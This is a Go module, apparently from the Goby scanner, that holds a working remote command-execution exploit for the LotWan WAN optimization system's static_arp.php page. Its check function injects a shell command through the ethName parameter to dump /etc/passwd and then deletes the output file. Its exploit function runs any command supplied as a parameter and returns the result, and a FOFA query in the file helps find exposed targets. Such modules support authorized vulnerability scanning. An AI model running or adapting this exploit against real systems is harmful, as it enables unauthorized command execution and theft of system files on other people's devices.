package exploits

import (
	"git.gobies.org/goby/goscanner/goutils"
	"git.gobies.org/goby/goscanner/jsonvul"
	"git.gobies.org/goby/goscanner/scanconfig"
	"git.gobies.org/goby/httpclient"
	"net/url"
	"regexp"
)

func init() {
	expJson := `{
    "Name": "LotWan static_arp.php RCE",
    "Description": "<p>LotWan is a WAN optimization management system that fully realizes unified application delivery, integrates high-performance link load balancing, precise flow control, WAN acceleration functions, and combines blocking and dredging.</p><p>LotWan WAN optimization system static_arp.php file has command execution loopholes, attackers can obtain system permissions.</p>",
    "Impact": "LotWan static_arp.php RCE",
    "Recommendation": "<p>The vendor has released a bug fix, please pay attention to the update in time: <a href=\"https://www.appexnetworks.com.cn\">https://www.appexnetworks.com.cn</a></p><p>1. Set access policies and whitelist access through security devices such as firewalls.</p><p>2.If not necessary, prohibit public network access to the system.</p>",
    "Product": "LotWan",
    "VulType": [
        "Command Execution"
    ],
    "Tags": [
        "Command Execution"
    ],
    "Translation": {
        "CN": {
            "Name": "LotWan 广域网优化管理系统 static_arp.php 文件远程命令执行漏洞",
            "Description": "<p>LotWan 是一款全面实现统一应用交付 集成高性能链路负载均衡、精确流量控制、广域网加速功能,寻堵疏结合的广域网优化管理系统。</p><p>LotWan 广域网优化系统 static_arp.php文件存在命令执行漏洞，攻击者可获取系统权限。</p>",
            "Impact": "<p>LotWan 广域网优化系统 static_arp.php文件存在命令执行漏洞，攻击者可获取系统权限。</p>",
            "Recommendation": "<p>⼚商已发布了漏洞修复程序，请及时关注更新：<a href=\"https://www.appexnetworks.com.cn\">https://www.appexnetworks.com.cn</a></p><p>1、通过防⽕墙等安全设备设置访问策略，设置⽩名单访问。</p><p>2、如⾮必要，禁⽌公⽹访问该系统。</p>",
            "Product": "LotWan",
            "VulType": [
                "命令执行"
            ],
            "Tags": [
                "命令执行"
            ]
        },
        "EN": {
            "Name": "LotWan static_arp.php RCE",
            "Description": "<p>LotWan is a WAN optimization management system that fully realizes unified application delivery, integrates high-performance link load balancing, precise flow control, WAN acceleration functions, and combines blocking and dredging.</p><p>LotWan WAN optimization system static_arp.php file has command execution loopholes, attackers can obtain system permissions.</p>",
            "Impact": "LotWan static_arp.php RCE",
            "Recommendation": "<p>The vendor has released a bug fix, please pay attention to the update in time: <a href=\"https://www.appexnetworks.com.cn\">https://www.appexnetworks.com.cn</a></p><p>1. Set access policies and whitelist access through security devices such as firewalls.</p><p>2.If not necessary, prohibit public network access to the system.</p>",
            "Product": "LotWan",
            "VulType": [
                "Command Execution"
            ],
            "Tags": [
                "Command Execution"
            ]
        }
    },
    "FofaQuery": "body=\"北京华夏创新科技有限公司\"",
    "GobyQuery": "body=\"北京华夏创新科技有限公司\"",
    "Author": "1291904552@qq.com",
    "Homepage": "https://www.appexnetworks.com.cn",
    "DisclosureDate": "2021-11-01",
    "References": [
        "https://fofa.so"
    ],
    "HasExp": true,
    "Is0day": false,
    "Level": "2",
    "CVSS": "8.0",
    "CVEIDs": [],
    "CNVD": [],
    "CNNVD": [],
    "ScanSteps": [
        "AND",
        {
            "Request": {
                "method": "GET",
                "uri": "/",
                "follow_redirect": false,
                "header": {},
                "data_type": "text",
                "data": ""
            },
            "ResponseTest": {
                "type": "group",
                "operation": "AND",
                "checks": [
                    {
                        "type": "item",
                        "variable": "$code",
                        "operation": "==",
                        "value": "200",
                        "bz": ""
                    }
                ]
            },
            "SetVariable": []
        }
    ],
    "ExploitSteps": [
        "AND",
        {
            "Request": {
                "method": "GET",
                "uri": "/",
                "follow_redirect": false,
                "header": {},
                "data_type": "text",
                "data": ""
            },
            "ResponseTest": {
                "type": "group",
                "operation": "AND",
                "checks": [
                    {
                        "type": "item",
                        "variable": "$code",
                        "operation": "==",
                        "value": "200",
                        "bz": ""
                    }
                ]
            },
            "SetVariable": []
        }
    ],
    "ExpParams": [
        {
            "name": "cmd",
            "type": "input",
            "value": "whoami",
            "show": ""
        }
    ],
    "ExpTips": {},
    "AttackSurfaces": {
        "Application": [],
        "Support": [],
        "Service": [],
        "System": [
            "LotWan"
        ],
        "Hardware": []
    },
    "PocId": "10236"
}`

	ExpManager.AddExploit(NewExploit(
		goutils.GetFileName(),
		expJson,
		func(exp *jsonvul.JsonVul, u *httpclient.FixUrl, ss *scanconfig.SingleScanConfig) bool {
			RandtxtName := goutils.RandomHexString(4)
			uri := "/acc/bindipmac/static_arp.php?ethName=||cat%20/etc/passwd>" + RandtxtName + ".txt||"
			cfg := httpclient.NewGetRequestConfig(uri)
			cfg.VerifyTls = false
			if resp, err := httpclient.DoHttpRequest(u, cfg); err == nil && resp.StatusCode == 200 {
				uri2 := "/acc/bindipmac/" + RandtxtName + ".txt"
				cfg2 := httpclient.NewGetRequestConfig(uri2)
				cfg2.VerifyTls = false
				if resp2, err := httpclient.DoHttpRequest(u, cfg2); err == nil {
					uri3 := "/acc/bindipmac/static_arp.php?ethName=||rm%20-f%20" + RandtxtName + ".txt||"
					cfg3 := httpclient.NewGetRequestConfig(uri3)
					cfg3.VerifyTls = false
					httpclient.DoHttpRequest(u, cfg3)
					return resp2.StatusCode == 200 && regexp.MustCompile("root:(.*?):0:0:").MatchString(resp2.RawBody)
				}
			}
			return false
		},
		func(expResult *jsonvul.ExploitResult, ss *scanconfig.SingleScanConfig) *jsonvul.ExploitResult {
			cmd := ss.Params["cmd"].(string)
			RandtxtName := goutils.RandomHexString(4)
			uri := "/acc/bindipmac/static_arp.php?ethName=||" + url.QueryEscape(cmd) + ">" + RandtxtName + ".txt||"
			cfg := httpclient.NewGetRequestConfig(uri)
			cfg.VerifyTls = false
			if resp, err := httpclient.DoHttpRequest(expResult.HostInfo, cfg); err == nil && resp.StatusCode == 200 {
				uri2 := "/acc/bindipmac/" + RandtxtName + ".txt"
				cfg2 := httpclient.NewGetRequestConfig(uri2)
				cfg2.VerifyTls = false
				if resp2, err := httpclient.DoHttpRequest(expResult.HostInfo, cfg2); err == nil && resp2.StatusCode == 200 {
					expResult.Output = resp2.RawBody
					expResult.Success = true
					uri3 := "/acc/bindipmac/static_arp.php?ethName=||rm%20-f%20" + RandtxtName + ".txt||"
					cfg3 := httpclient.NewGetRequestConfig(uri3)
					cfg3.VerifyTls = false
					httpclient.DoHttpRequest(expResult.HostInfo, cfg3)
				}
			}
			return expResult
		},
	))
}
